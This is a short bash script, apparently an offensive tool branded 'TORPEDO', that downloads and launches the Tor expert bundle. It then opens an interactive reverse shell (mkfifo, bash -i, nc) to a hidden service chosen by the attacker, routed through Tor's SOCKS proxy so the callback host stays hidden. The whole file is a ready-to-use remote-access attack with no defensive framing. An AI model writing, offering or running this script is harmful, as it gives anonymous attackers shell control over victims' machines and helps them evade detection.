#!/bin/bash
echo "
ooooooooooooo   .oooooo.   ooooooooo.   ooooooooo.   oooooooooooo oooooooooo.     .oooooo.
8'   888    8  d8P'   Y8b   888    Y88.  888    Y88.  888'      8  888'    Y8b   d8P'   Y8b
     888      888      888  888   .d88'  888   .d88'  888          888      888 888      888
     888      888      888  888ooo88P'   888ooo88P'   888oooo8     888      888 888      888
     888      888      888  888 88b.     888          888          888      888 888      888
     888       88b    d88'  888   88b.   888          888       o  888     d88'  88b    d88'
    o888o       Y8bood8P'  o888o  o888o o888o        o888ooooood8 o888bood8P'     Y8bood8P'
    "

URL="https://archive.torproject.org/tor-package-archive/torbrowser/12.5.2/tor-expert-bundle-12.5.2-linux-x86_64.tar.gz"
mkdir -p t0rP0rt4bl3
cd t0rP0rt4bl3
wget "$URL" -O fil3.tar.gz
tar -xzf fil3.tar.gz
rm fil3.tar.gz
./tor/tor &
TOR_PID=$!

function cleanup() {
    kill $TOR_PID
    rm -rf t0rP0rt4bl3
    exit
}

sleep 10s
HS="${1:-xxxonionhiddenservicexxx.onion}"
PORT="${2:-80}"

mkfifo /tmp/f; bash -i < /tmp/f 2>&1 | nc -x 127.0.0.1:9050 $HS $PORT > /tmp/f 2>&1; rm /tmp/f
